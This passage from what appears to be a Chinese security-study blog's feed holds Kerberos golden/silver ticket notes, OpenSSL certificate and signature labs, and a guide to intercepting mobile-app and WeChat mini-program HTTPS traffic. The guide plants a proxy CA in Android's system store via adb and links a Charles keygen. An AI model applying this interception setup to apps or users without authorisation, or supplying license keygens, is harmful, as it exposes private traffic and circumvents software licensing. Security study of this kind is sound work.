alt="image-20240908163018011"></p><p>张三想访问web系统中的某些服务，需要先向kdc中的as传递身份信息，AS确认信息后返回TGT，张三拿着TGT再向TGS获取ST，不同的服务需要不同的ST，每访问一个服务都要获取对应的ST</p><p>伪造TGT叫黄金票据</p><p>伪造ST叫白银票据</p><p><img src="/../image/image-20240908193141164.png" alt="image-20240908193141164"></p><p>用户提供信息给KDC，KDC返回TGT，其中一部分是用用户的密钥加密的，一部分使用KDC的密钥加密的，用户是可以解开上一部分的</p><p><img src="/../image/image-20240908193331772.png" alt="image-20240908193331772"></p><p>用户收到后，会对TGT重新封装，先用自己的密钥解开能部分信息，取出CT_SK，然后再重新加密，并把需要访问的服务名封装在一起，形成新的TGT，然后传递给KDC，KDC返回ST</p><p><img src="/../image/image-20240908194858785.png" alt="image-20240908194858785"></p><p>TGS(ticket granting service)作用:为client生成某个服务的tick</p><p>TGT(ticket-granting ticket)作用:用于获取ticket的票据的票据</p><p>KRBGTG:密钥分发中心(KDC)的账户名</p><p><strong>黄金票据</strong>：除了krbgtg无法伪造，其它信息都可以伪造，我们只需要获得krbgtg即可伪造黄金票据</p><p><strong>条件</strong></p><p><img src="/../image/image-20240908195503477.png" alt="image-20240908195503477"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学之CA的使用</title>
      <link href="/2024/08/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8BCA%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8BCA%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h4 id="一、生成selfsigned证书"><a href="#一、生成selfsigned证书" class="headerlink" title="一、生成selfsigned证书"></a>一、生成selfsigned证书</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt</span><br></pre></td></tr></table></figure><ul><li><code>req</code>: 表示这是一个证书签名请求（CSR）或自签名证书的操作。</li><li><code>-x509</code>: 指示OpenSSL直接生成一个自签名证书，而不是生成一个CSR。</li><li><code>-nodes</code>: 表示生成的私钥不会被加密（即没有密码保护）。这便于自动化脚本或程序直接访问私钥，但在生产环境中不推荐这样做，因为它降低了安全性。</li><li><code>-days 365</code>: 设置证书的有效期为365天。</li><li><code>-newkey rsa:2048</code>: 表示生成一个新的RSA私钥，密钥长度为2048位。这是目前广泛接受的密钥长度，既安全又相对高效。</li><li><code>-keyout privateKey.key</code>: 指定生成的私钥文件的名称。</li><li><code>-out certificate.crt</code>: 指定生成的证书文件的名t称</li></ul><p><img src="/../image/image-20240828132508213.png" alt="image-20240828132508213"></p><p>依次输入证书的相关信息,国家，省份，城市，公司，部门，域名，邮箱</p><p><img src="/../image/image-20240828132533733.png" alt="image-20240828132533733"></p><p><img src="/../image/image-20240828132542275.png" alt="image-20240828132542275"></p><h4 id="二、生成独立的CA"><a href="#二、生成独立的CA" class="headerlink" title="二、生成独立的CA"></a>二、生成独立的CA</h4><p>1、 生成ca的key<br><code>openssl genrsa -des3 -out ca.key 4096</code></p><p><img src="/../image/image-20240828132707898.png" alt="image-20240828132707898"></p><p>2、生成CA的证书<br><code>openssl req -new -x509 -days 365 -key ca.key -out ca.crt</code></p><p><img src="/../image/image-20240828132820060.png" alt="image-20240828132820060"></p><h4 id="三、生成服务器的私钥key和签名请求文件csr"><a href="#三、生成服务器的私钥key和签名请求文件csr" class="headerlink" title="三、生成服务器的私钥key和签名请求文件csr"></a>三、生成服务器的私钥key和签名请求文件csr</h4><p>1、生成https服务器私钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -des3 -out myserver.key 4096</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240828133703355.png" alt="image-20240828133703355"></p><p>2、生成https服务器证书请求文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -new -key myserver.key -out myserver.csr</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240828133924097.png" alt="image-20240828133924097"></p><h3 id="利用ca的证书和key，生成我们的证书"><a href="#利用ca的证书和key，生成我们的证书" class="headerlink" title="利用ca的证书和key，生成我们的证书"></a>利用ca的证书和key，生成我们的证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -days 365 -in myserver.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out myserver.crt</span><br></pre></td></tr></table></figure><p>Set_serial设置的证书的编号</p><p><img src="/../image/image-20240828134035125.png" alt="image-20240828134035125"></p><p>查看证书的信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -noout -text -in myserver.crt | more</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240828134101620.png" alt="image-20240828134101620"></p><h4 id="四、验证证书"><a href="#四、验证证书" class="headerlink" title="四、验证证书"></a>四、验证证书</h4><h3 id="验证证书的CA"><a href="#验证证书的CA" class="headerlink" title="验证证书的CA"></a>验证证书的CA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl verify -CAfile ca.crt myserver.crt</span><br></pre></td></tr></table></figure><p>去掉https服务器证书的加密保护：<br><code>openssl rsa -in myserver.key -out server.key.insecure</code></p><p>将CRT格式转DER格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -outform der -in myserver.crt -out myserver.der</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240828134153488.png" alt="image-20240828134153488"></p><h4 id="五、模拟https服务："><a href="#五、模拟https服务：" class="headerlink" title="五、模拟https服务："></a>五、模拟https服务：</h4><p>模拟https的服务，将结果输出到1.txt，并在后台运行<br><code>openssl s_server -accept 443 -cert myserver.crt -key server.key.insecure -www &gt;1.txt &amp;</code></p><p>模拟用户连接<br><code>openssl s_client -connect 127.0.0.1:443 | more </code></p><p>按ctrl+c中断当前查看</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过新建CA服务器证书， 对https服务的csr签名，并模拟https服务器，进行访问</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学之数字签名</title>
      <link href="/2024/08/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
      <url>/2024/08/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学之数字签名"><a href="#密码学之数字签名" class="headerlink" title="密码学之数字签名"></a>密码学之数字签名</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>掌握哈希算法与数字签名算法的实现</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>一台Centos 7.2 已经安装openssl组件</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>一、生成测试文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 12345   &gt;  test.txt</span><br><span class="line"></span><br><span class="line">echo hello  &gt; md.txt</span><br><span class="line">cat test.txt md.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210440006.png" alt="image-20240827210440006"></p><p>二、使用MD5算法生成哈希值</p><p>生成md.txt的哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dgst -md5 md.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210508476.png" alt="image-20240827210508476"></p><p>复制md.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp md.txt  md.txt.2</span><br><span class="line">ls md.*</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210534150.png" alt="image-20240827210534150"></p><p>对md.txt.2生成md5哈希值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dgst -md5 md.txt.2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210616009.png" alt="image-20240827210616009"></p><p>比对发现md.txt和md.txt.2两个文件的哈希值一样</p><p>三、使用RSA签名</p><p>1、生成RSA密钥对</p><p><code>openssl genrsa -out rsa.key 1024</code><br><img src="/../image/image-20240827210703866.png" alt="image-20240827210703866"></p><p>2、导出公钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in rsa.key -pubout -out rsa_pub.key</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210727484.png" alt="image-20240827210727484"></p><p>3、使用rsa私钥签名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl sha1 -sign rsa.key -out rsasign.bin test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827210950988.png" alt="image-20240827210950988"></p><p>4、使用rsa 公钥验证签名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl sha1 -verify rsa_pub.key -signature rsasign.bin test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211015070.png" alt="image-20240827211015070"></p><h4 id="四、使用DSA签名"><a href="#四、使用DSA签名" class="headerlink" title="四、使用DSA签名"></a>四、使用DSA签名</h4><p>1、生成dsa参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dsaparam -out dsap.pem 1024</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211041883.png" alt="image-20240827211041883"></p><p>2、查看dsa参数明文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dsaparam -in dsap.pem -text -noout</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211100885.png" alt="image-20240827211100885"></p><p>3、使用上述参数生成dsa密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl gendsa -out dsa1.pem dsap.pem</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211209664.png" alt="image-20240827211209664"></p><p>4、再次使用上述参数生成dsa密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl gendsa -out dsa2.pem dsap.pem</span><br></pre></td></tr></table></figure><p>比较上述两个密钥,由相同参数生成的两个密钥是不同的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff dsa1.pem  dsa2.pem</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211301433.png" alt="image-20240827211301433"></p><p>6、由参数生成私钥，并使用des加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl gendsa -out dsaprivatekey.pem -des3 dsap.pem</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211357486.png" alt="image-20240827211357486"></p><p>7、由私钥生成公钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dsa -in dsaprivatekey.pem -pubout -out dsapublickey.pem</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211420022.png" alt="image-20240827211420022"></p><p>8、使用私钥dsaprivatekey.pem签名text.txt，dsasign.bin为签名文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dgst -dss1 -sign dsaprivatekey.pem -out dsasign.bin test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211455400.png" alt="image-20240827211455400"></p><p>9、使用公钥验证签名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dgst -dss1 -verify dsapublickey.pem -signature dsasign.bin test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211523612.png" alt="image-20240827211523612"></p><p>10、使用私钥验证签名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl dgst -dss1 -prverify dsaprivatekey.pem -signature dsasign.bin test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827211555424.png" alt="image-20240827211555424"></p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过使用rsa和dsa的签名，加强密码学中签名应用的理解。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>openssl基础使用</title>
      <link href="/2024/08/27/openssl%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/27/openssl%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OPENSSL基础使用"><a href="#OPENSSL基础使用" class="headerlink" title="OPENSSL基础使用"></a>OPENSSL基础使用</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>掌握常见的密码学算法应用，包含des aes md5 rsa等掌握常见的密码学算法应用，包含des AES MD5 RSA等</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>一台Centos 7.2 已经安装openssl组件</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>创建一个文件，用于被加密，文件内容为12345,文件名为test.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 12345 &gt;test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827155328814.png" alt="image-20240827155328814"></p><h4 id="一、对称加密"><a href="#一、对称加密" class="headerlink" title="一、对称加密"></a>一、对称加密</h4><p>1、使用rc4加解密</p><p>加密<br><code>openssl enc -e -rc4 -in test.txt -out test_rc4.txt</code></p><p><img src="/../image/image-20240827155447732.png" alt="image-20240827155447732"></p><p>解密<br><code>openssl enc -d -rc4 -in test_rc4.enc -out test_rc4.dm</code></p><p><img src="/../image/image-20240827155613980.png" alt="image-20240827155613980"></p><p>2、使用AES加解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -e -aes-128-cbc -a -salt -in test.txt -out test_aes128.enc</span><br></pre></td></tr></table></figure><ul><li><code>-a</code>：这个选项表示以Base64编码格式输出加密后的数据。Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于加密后的数据可能包含无法直接在文本文件中存储的字符（如控制字符或二进制零），所以通常会用Base64编码来安全地表示这些加密数据。</li><li><code>-salt</code>：这个选项指示OpenSSL在加密过程中使用一个随机的盐值（salt）。盐值是一个随机数据块，与加密密钥结合使用来增加加密的安全性。每次加密相同的数据时，如果使用了不同的盐值，就会产生不同的加密输出，这有助于抵抗某些类型的攻击，如字典攻击。</li></ul><p><img src="/../image/image-20240827161043204.png" alt="image-20240827161043204"></p><p>解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -d -aes-128-cbc -a -salt -in test_aes128.enc -out test_aes128.d</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827161119743.png" alt="image-20240827161119743"></p><p>3、使用3DES加解密</p><p>加密<br><code>openssl enc -e -des3 -a -salt -in test.txt -out test_des3.enc</code></p><p><img src="/../image/image-20240827161201044.png" alt="image-20240827161201044"></p><p>解密<br><code>openssl enc -d -des3 -a -salt -in test_des3.enc -out test_des3.d</code></p><p><img src="/../image/image-20240827161236192.png" alt="image-20240827161236192"></p><h4 id="二、非对称加密"><a href="#二、非对称加密" class="headerlink" title="二、非对称加密"></a>二、非对称加密</h4><p>1、RSA加解密码</p><p>生成RSA密钥对</p><p><code>openssl genrsa -out rsa.key 1024</code><br><img src="/../image/image-20240827161300110.png" alt="image-20240827161300110"><br>敲错了。。。导出公钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in rsa.key -pubout -out rsa_pub.key</span><br></pre></td></tr></table></figure><ul><li><code>-pubout</code>：这个选项告诉<code>openssl rsa</code>命令执行提取公钥的操作。默认情况下，<code>openssl rsa</code>命令用于处理私钥，但加上<code>-pubout</code>选项后，它会从私钥中提取出对应的公钥。</li></ul><p><img src="/../image/image-20240827161412254.png" alt="image-20240827161412254"></p><p>使用公钥加密文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsautl -encrypt -in test.txt -inkey rsa_pub.key -pubin -out test_rsa.enc</span><br></pre></td></tr></table></figure><p><code>-pubin</code>：这个选项告诉<code>openssl rsautl</code>命令输入密钥是一个公钥。在大多数情况下，当使用<code>-inkey</code>选项时，OpenSSL会尝试根据密钥的内容自动判断它是公钥还是私钥。然而，在某些情况下（尤其是当密钥文件没有标准的公钥或私钥头部时），明确指定<code>-pubin</code>可以避免混淆。</p><p><img src="/../image/image-20240827161520755.png" alt="image-20240827161520755"></p><p>使用私解解密文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in test_rsa.enc -inkey rsa.key -out test_rsa.c</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827162053421.png" alt="image-20240827162053421"></p><p>使用公钥解密报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in test_rsa.enc -inkey rsa_pub.key -out test_rsa.c</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240827162110243.png" alt="image-20240827162110243"></p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过实验的openssl 实现对称加解密与非对称加解密两种基线的加解密功能。<br>思考对称与非对称加解密码的流程上有何不同？为什么？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>app|微信小程序|公众号测试环境搭建笔记</title>
      <link href="/2024/08/26/app-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/08/26/app-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="app抓包"><a href="#app抓包" class="headerlink" title="app抓包"></a>app抓包</h1><p>超级全：<a href="https://cloud.tencent.com/developer/article/2316324">https://cloud.tencent.com/developer/article/2316324</a></p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>配置证书有时候可以直接安装，但有时候（安卓7.0以上）我们需要将证书命名为计算出的哈希值后缀.0导入到根证书目录：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts 让系统默认可信任。</p><p><img src="/../image/image-20240826185739790.png" alt="image-20240826185739790"></p><h2 id="httpcanary"><a href="#httpcanary" class="headerlink" title="httpcanary"></a>httpcanary</h2><p><a href="https://blog.csdn.net/weixin_53891182/article/details/124739048">https://blog.csdn.net/weixin_53891182/article/details/124739048</a></p><p>下载号apk拖到模拟器里即可</p><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><p>模拟器设置里看是否是root模式</p><p><img src="/../image/image-20240826191939957.png" alt="image-20240826191939957"></p><p>httpcanary设置-》SSL证书设置-》导出根证书-》.0（root）&#x2F;.pem文件（未root）(直接用他装也可以，不一定要导出)</p><p>但.0的证书在收集的设置里是导不进去的，我们选择pem</p><p>手机设置，然后 找到并点击“安全”–&gt;“更多安全设置”–&gt;凭据储存下的“从手机储存安装”–&gt;CA证书（不同手机系统这步可能不完全相同，但都大同小异按这几个关键词找一下或者直接搜索）<br><img src="/../image/image-20240826192725429.png" alt="image-20240826192725429"></p><p>安装完成后，可以在用户凭据里看到看到，感觉没有哪个.0不一定抓的全，但也能抓到就是了</p><p><img src="/../image/image-20240826193028584.png" alt="image-20240826193028584"></p><p><img src="/../image/image-20240826193403755.png" alt="image-20240826193403755"></p><p>还是用adb传上去把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 打开adb 脚本</span><br><span class="line">adb shell</span><br><span class="line"># 挂载磁盘</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"># 切换至证书目录</span><br><span class="line">cd /data/misc/user/0/cacerts-added/</span><br><span class="line"># 查看证书是否存在</span><br><span class="line">ls</span><br><span class="line"># 复制证书</span><br><span class="line">cp 证书 /system/etc/security/cacerts/</span><br><span class="line"># 退出adb脚本</span><br><span class="line">exit</span><br><span class="line"># adb拿证书</span><br><span class="line">adb pull /data/misc/user/0/cacerts-added/证书</span><br><span class="line"># adb存证书</span><br><span class="line">adb push 证书 /system/etc/security/cacerts/</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240826193935083.png" alt="image-20240826193935083"></p><p>这里我发现他已经装好了，那就不一步一步试了</p><h2 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h2><p><a href="https://blog.csdn.net/qq_45005145/article/details/141132846">https://blog.csdn.net/qq_45005145/article/details/141132846</a></p><p>注册码生成：<a href="https://inused.github.io/pages/file/tool/CharlesKeygen.html">https://inused.github.io/pages/file/tool/CharlesKeygen.html</a></p><p>抓本地的包，我就不演示了，演示下抓手机的包把</p><p>设置代理，在 <code>Proxy — Proxy Settings</code> ( <code>注意：此时我的Windows Proxy是去掉对勾的，因为这里我是想在PC端抓手机端的包，所以没必要打开电脑的本地代理</code> )</p><p><img src="/../image/image-20240826200516422.png" alt="image-20240826200516422"></p><p>填入代理端口 <code>4444</code>（或者自定义，但不能和系统已占用端口冲突），并且勾上 <code>Support HTTP/2</code> 和 <code>Enable transparent HTTP proxying</code> ，点击右下角 OK 即可</p><p>然后分别在 PC 端和手机端安装证书 选择 <code>Help — SSL Proxying — Install Charles Root Certificate</code> 就可以下载安装上 PC 端了</p><p><img src="/../image/image-20240826200611104.png" alt="image-20240826200611104"></p><p>PC的就是当前用户，受信任的证书颁发机构</p><p>接下来再给手机端安装证书，步骤如下： 选择 <code>Help — SSL Proxying — Install Charles Root Certificate on a Mobile Device or Remote Browser</code></p><p><img src="/../image/image-20240826200807747.png" alt="image-20240826200807747"></p><p>然后把代理设置成这个，这里敲错了，应该是147的</p><p><img src="/../image/image-20240826200912923.png" alt="image-20240826200912923"></p><p><img src="/../image/image-20240826201156943.png" alt="image-20240826201156943"></p><p>访问<a href="http://chls.pro/ssl%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6">http://chls.pro/ssl下载证书</a></p><p><img src="/../image/image-20240826201221043.png" alt="image-20240826201221043"></p><p>然后和httpcanary一样，在手机里安装即可</p><p><img src="/../image/image-20240826201511738.png" alt="image-20240826201511738"></p><p>它也是安装在 <code>用户</code> 那里，但是由于我的设备是已经 root 了，要把这个证书安装在 <code>系统</code> 那里才能进行抓取 HTTPS 流量，但我这里好像已经行抓了，不懂为什么，移动的方法可以用MT也可以用ADB</p><p><img src="/../image/image-20240826201647783.png" alt="image-20240826201647783"></p><p> charles还可以结合上burp使用</p><p><img src="/../image/image-20240826202251100.png" alt="image-20240826202251100"></p><p><img src="/../image/image-20240826203351466.png" alt="image-20240826203351466"></p><p>有时候包会放的特别慢，可能是开了这个，关掉就就好</p><p><img src="/../image/image-20240826203423156.png" alt="image-20240826203423156"></p><h2 id="Postern-Charles-BP"><a href="#Postern-Charles-BP" class="headerlink" title="Postern + Charles + BP"></a>Postern + Charles + BP</h2><p>在实际抓手机 App 包场景中，有很多种方案，经典的就是 <code>Fiddler</code> 、 <code>Burpsuite</code> ，但是 <code>Fiddler</code> 、 <code>Burpsuite</code> 会遇到一个问题，如果 App 为了防止中间人抓包，特意设置了不走代理这个选项，那单独直接用 <code>Fiddler</code> 、 <code>Burpsuite</code> 这些抓包工具就不能抓包的，那总不可能说不能抓包就认为目标系统很安全吧？为了抓到完整的包，于是就衍生出 <code>Postern + Charles</code> 这个组合，是因为 <code>Charles</code> 没有直接监听到 App，<code>Charles</code> 是监听到了 <code>Postern</code> 上，<code>Postern</code> 就是一个<code>VPN</code> ，所以 App 设置不走代理也没用，它是通过 VPN 将所有流量转发到 Charles 的 <code>socks</code> 代理，再打开 Charles 的 <code>External Proxy Server</code> — （外部代理服务器）转发到 Burpsuite，从而实施中间人抓包</p><p>配置Charles</p><p>在 Proxy — Proxy Settings ，勾选 Enable SOCKS proxy 进行设置 SOCKS 代理（按照下图的操作），端口号我这里设置8889（或者自定义，但不能和系统已占用端口冲突）</p><p><img src="/../image/image-20240827163623622.png" alt="image-20240827163623622"></p><p>配置postern</p><p>左上角-》配置代理</p><p><img src="/../image/image-20240827173046030.png" alt="image-20240827173046030"></p><p>配置规则</p><p><img src="/../image/image-20240827173127006.png" alt="image-20240827173127006"></p><p>然后开启vpn，一般第一次连上会弹出这个，点击allow即可</p><p><img src="/../image/image-20240827173222290.png" alt="image-20240827173222290"></p><p><img src="/../image/image-20240827172605055.png" alt="image-20240827172605055"></p><p>有时候抓包不成功，可能是规则太多了，要把那些删了，或者说调整规则顺序</p><h1 id="小程序抓包"><a href="#小程序抓包" class="headerlink" title="小程序抓包"></a>小程序抓包</h1><h2 id="Proxfier-Burp-PC端wechat"><a href="#Proxfier-Burp-PC端wechat" class="headerlink" title="Proxfier+Burp+PC端wechat"></a>Proxfier+Burp+PC端wechat</h2><h3 id="配置proxfier"><a href="#配置proxfier" class="headerlink" title="配置proxfier"></a>配置proxfier</h3><p>首先需要找到微信小程序的运行文件 WeChatAppEx 的物理路径，然后把此文件添加到 Proxifier 的代理规则中。这里多说一下，如果也想要抓取微信内置浏览器的数据包的话，需要找到 WechatBrowser 的物理路径。找这两个的文件的物理路径可以通过任务管理器来找到。比如小程序 WeChatAppEx 文件，首先打开任意一个小程序，打开任务管理器找到以小程序命名的进程名称 ，右键打开文件所在的位置来确定其物理路径，这里以打开欢乐斗地主为例，如下图。使用微信内置浏览器打开任意网页，用同样的方法可以找到 WechatBrowser 的物理路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WeChatAppEx  默认路径：%%%Roaming\Tencent\WeChat\XPlugin\Plugins\RadiumWMPF\11253\extracted\runtime（不一定是11253，这个数字会有差异）</span><br><span class="line">WechatBrowser默认路径：%appdata%\Tencent\WeChat\XPlugin\Plugins\XWeb\920\extracted  （不一定是920，这个数字会有差异）</span><br><span class="line">但一定都是在%appdata%\Tencent\WeChat\XPlugin\Plugins这个文件夹下</span><br></pre></td></tr></table></figure><p>对于找路径其实有个更简单的方法，就是使用 everything 这个搜索软件直接搜索 WeChatAppEx 和 WechatBrowser 文件，直接找到其物理路径。默认情况下都是只有一个的，如果有多个的话，需要用上述方法去确认一下具体使用的是哪个。</p><p>Proxifier 配置：开启 HTTP 代理配置功能，这个设置默认是关闭的。</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233447748.png" alt="image-20240902233447748"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233459391.png" alt="image-20240902233459391"></p><p>配置代理服务器：端口保持和 burpsuite 的监听端口一致就行，下面协议选择 https 。</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233659535.png" alt="image-20240902233659535"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233605870.png" alt="image-20240902233605870"></p><p>配置代理规则：按照下图的数字顺序进行操作，点击第3步之后定位到上面的物理路径，选择 WeChatAppEx 或 WechatBrowser 的可执行文件 。一定要记得点两个OK按钮进行保存设置。</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233715780.png" alt="image-20240902233715780"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233754844.png" alt="image-20240902233754844"></p><p>这里有个小技巧，就是在测试过程中很多时候都是不想抓取baidu.com、qq.com等这类的域名流量，一旦这类的数据包很多的话，很影响测试。所以可以加个规则，让这类的域名或IP直接直连，从而不走设置的代理，这样就能减少好多无用数据包，方便测试。</p><p>另一个注意的点就是多个规则的排序问题了。选中一个规则后，使用右边的按钮可以进行调整顺序，类似于优先级。如果设置了上步不走代理的规则，一定要保证这个规则是在微信小程序规则的上面，要不然等同于没设置。</p><p>设置完之后就可以正常的使用burpsuite抓取小程序的数据包了。在使用 Proxifier 这个代理软件的同时，尽量不要去使用其他的V2、SSR等代理软件，以免发生冲突。</p><h3 id="BP"><a href="#BP" class="headerlink" title="BP"></a>BP</h3><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902233900901.png" alt="image-20240902233900901"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902234013677.png" alt="image-20240902234013677"></p><p>如果抓不到可能是走了代理，去network里把use socks proxy关了</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902234045386.png" alt="image-20240902234045386"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IPC</title>
      <link href="/2024/08/25/IPC/"/>
      <url>/2024/08/25/IPC/</url>
      
